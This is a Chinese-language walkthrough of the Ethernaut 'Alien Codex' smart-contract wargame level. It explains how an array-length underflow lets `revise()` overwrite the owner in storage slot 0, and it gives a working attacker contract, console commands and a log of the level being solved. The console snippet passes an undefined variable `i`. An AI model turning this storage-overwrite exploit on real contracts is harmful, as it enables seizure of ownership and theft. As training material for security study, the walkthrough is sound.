



# 20 Alien Codex

## 思路

目标: 获取下面合约的所有权

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```



思路:

上面的合约导入了 `Ownable-05.sol`,  我们先打印其ABI, 看看有哪些接口

```
console.log(JSON.stringify(contract.abi));
```

输出

```
[{"constant":false,"inputs":[{"name":"i","type":"uint256"},{"name":"_content","type":"bytes32"}],"name":"revise","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function","signature":"0x0339f300"},{"constant":true,"inputs":[],"name":"contact","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function","signature":"0x33a8c45a"},{"constant":false,"inputs":[],"name":"retract","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function","signature":"0x47f57b32"},{"constant":false,"inputs":[],"name":"make_contact","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function","signature":"0x58699c55"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function","signature":"0x715018a6"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function","signature":"0x8da5cb5b"},{"constant":true,"inputs":[],"name":"isOwner","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function","signature":"0x8f32d59b"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"codex","outputs":[{"name":"","type":"bytes32"}],"payable":false,"stateMutability":"view","type":"function","signature":"0x94bd7569"},{"constant":false,"inputs":[{"name":"_content","type":"bytes32"}],"name":"record","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function","signature":"0xb5c645bd"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function","signature":"0xf2fde38b"},{"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event","signature":"0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0"}]
```



通过 https://github.com/gnidan/abi-to-sol 这个工具, 可以将上面的ABI转换为solidity

然后我们可以在我们的攻击合约中利用这个接口来编写攻击代码

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

interface AlienCodex {
    function revise(uint256 i, bytes32 _content) external;

    function contact() external view returns (bool);

    function retract() external;

    function make_contact() external;

    function renounceOwnership() external;

    function owner() external view returns (address);

    function isOwner() external view returns (bool);

    function codex(uint256) external view returns (bytes32);

    function record(bytes32 _content) external;

    function transferOwnership(address newOwner) external;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}

contract Attacker {
    function attack(address _target, address _player) public {
        //获取目标合约实例
        AlienCodex codex = AlienCodex(_target);
        //TODO Attack
        //...
    }
}

```



现在我们来查找漏洞

先反编译合约(https://pypi.org/project/panoramix-decompiler/), 得到

```solidity
# Palkeoramix decompiler.

def storage:
  contact is uint8 at storage 0 offset 160
  owner is addr at storage 0
  codex is array of uint256 at storage 1

def contact() payable:
  return bool(contact)

def owner() payable:
  return owner

def codex(uint256 _param1) payable:
  require calldata.size - 4 >= 32
  require _param1 < codex.length
  return codex[_param1]

#
#  Regular functions
#

def unknown58699c55() payable:
  contact = 1

def _fallback() payable: # default function
  revert

def isOwner() payable:
  return (caller == owner)

def record(bytes32 _param1) payable:
  require calldata.size - 4 >= 32
  require contact
  codex.length++
  codex[codex.length] = _param1

def renounceOwnership() payable:
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'
  log OwnershipTransferred(
        address previousOwner=owner,
        address newOwner=0)
  owner = 0

def revise(uint256 _param1, bytes32 _param2) payable:
  require calldata.size - 4 >= 64
  require contact
  require _param1 < codex.length
  codex[_param1] = _param2

def retract() payable:
  require contact
  codex.length--
  if codex.length > codex.length - 1:
      idx = codex.length - 1
      while codex.length > idx:
          codex[idx] = 0
          idx = idx + 1
          continue

def transferOwnership(address _newOwner) payable:
  require calldata.size - 4 >= 32
  if owner != caller:
      revert with 0, 'Ownable: caller is not the owner'
  if not _newOwner:
      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000,
                  32,
                  38,
                  0xfe4f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                  mem[202 len 26]
  log OwnershipTransferred(
        address previousOwner=owner,
        address newOwner=_newOwner)
  owner = _newOwner
```

可以看到对`owner`复制的地方全部都有条件检查, 无法进行直接赋值

但注意到`owner`存储在`slot 0`

```solidity
def storage:
  contact is uint8 at storage 0 offset 160
  owner is addr at storage 0
  codex is array of uint256 at storage 1
```

而下面的函数在对`codex[i]`对应  `slot x`进行赋值, 只要能让`codex[i]`的存储位置指向`slot 0` ,那么就可以对`owner`进行覆盖. 

```solidity
  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
```



OK, 现在就需要研究数组的数据存储方式

```solidity
 codex is array of uint256 at storage 1
```

数组`codex`对应的`slot 1 ` 并不是数组存储的起始位置, 这里只会存储codex的数组长度, 而数组的真正存储位置的起始位置是被计算出来的

看看存储分布情况

<img src="https://github.com/yinhui1984/imagehosting/blob/main/images/1676008972318710000.png?raw=true" alt="image" style="zoom:50%;" />

假设`codex`的存储起始位置(也就是codex[0]的位置)是slot N, 那么上图中`A`的值应该是多少?

```
（实际存储位置） =  （数组起始位置） +  （数组元素index）

===>

（数组元素index） = （实际存储位置）- （数组起始位置）

===>
	(A)   = （2^256-2）- (N)
	(A+1) = （2^256-1）-  (N)
	(A+2) =  (2^256)   - (N)  # 当index=A+2时, 数据存储位置为2^256, 这就会导致问题
```

从上面可以看出如果数组的index为 (2^256)   - (N) 时, 根据 `（实际存储位置）=（数组起始位置） +  （数组元素index）` ,那么实际存储位置为  N + (2^256)   - (N), 为 2^256, 但是slot编号的类型的uint256, 导出溢出, 变为0

所以`slot ?`处的值为 `slot 0`



所以我们现在知道 `codex[2**256 - N]` 指向 `slot 0`

而`N`又是如何被计算出来的呢?

```solidity
 N = uint256(keccak256(abi.encode(X))
```

其中X为声明数组时其分配的slot号 `codex is array of uint256 at storage 1` 这里是`1`

所以 `code[2**256 - uint256(keccak256(abi.encode(1))]` 指向`slot 0`



## 答案

```solidity

// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

interface AlienCodex {
    function revise(uint256 i, bytes32 _content) external;

    function contact() external view returns (bool);

    function retract() external;

    function make_contact() external;

    function renounceOwnership() external;

    function owner() external view returns (address);

    function isOwner() external view returns (bool);

    function codex(uint256) external view returns (bytes32);

    function record(bytes32 _content) external;

    function transferOwnership(address newOwner) external;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}

contract Attacker {
    function attack(address _target, address _player) public {
        AlienCodex codex = AlienCodex(_target);
        uint256 index = ((2**256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 palyer = bytes32(uint256(uint160(_player)));
        codex.make_contact();
        codex.retract();
        codex.revise(index, palyer);
    }
}
```





或者使用chrome控制台

```js
N = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
index = BigInt(2 ** 256) - BigInt(N)
content = '0x' + '0'.repeat(24) + player.slice(2)
await contract.revise(i, content)
```



```
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x9e183e33bc0735ca4900663d1f1ddb2b6ed7b1af4a17d19a89b34c91f42234a8
^^.js:35 => 实例地址0x4ED679f2bd2AD59748A27d60C1D3bC0F0e0560C1
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 13:16:13.780
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x9e183e33bc0735ca4900663d1f1ddb2b6ed7b1af4a17d19a89b34c91f42234a8
redux-logger.js:1  action SET_BLOCK_NUM @ 13:16:23.762
contract.address
"0x4ED679f2bd2AD59748A27d60C1D3bC0F0e0560C1"
redux-logger.js:1  action SET_GAS_PRICE @ 13:46:04.791
redux-logger.js:1  action SET_GAS_PRICE @ 14:16:06.836
redux-logger.js:1  action SET_BLOCK_NUM @ 14:34:03.969
player
"0x0E42765a33CD60dbF569ad4bE388Ad5293E02477"
^^.js:45 \(ˆ˚ˆ)/ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 14:34:50.097
redux-logger.js:1  action SET_BLOCK_NUM @ 14:34:53.815
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x99e78d7df4e8885325d69986c05dbb93a41873b3bd300c747682aead766264a2
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 14:34:54.483
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x99e78d7df4e8885325d69986c05dbb93a41873b3bd300c747682aead766264a2
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:73 t(-.-t) 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 14:35:04.050

```

